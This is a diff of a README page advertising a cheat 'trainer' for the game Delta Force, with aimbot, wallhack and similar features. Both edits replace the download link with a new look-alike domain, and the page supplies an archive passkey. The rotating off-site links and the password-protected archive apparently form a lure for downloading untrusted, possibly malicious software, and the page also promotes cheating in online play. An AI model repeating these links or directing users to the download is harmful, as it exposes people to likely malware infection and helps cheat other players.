@@ -6,7 +6,7 @@ Delta Force trainer with aimbot, ESP wallhack, radar hack, glow hack, no recoil,
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -80,7 +80,7 @@ Features include aimbot, ESP wallhack, radar hack, glow hack, no recoil, and loo
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 
 2. Extract the archive.
 
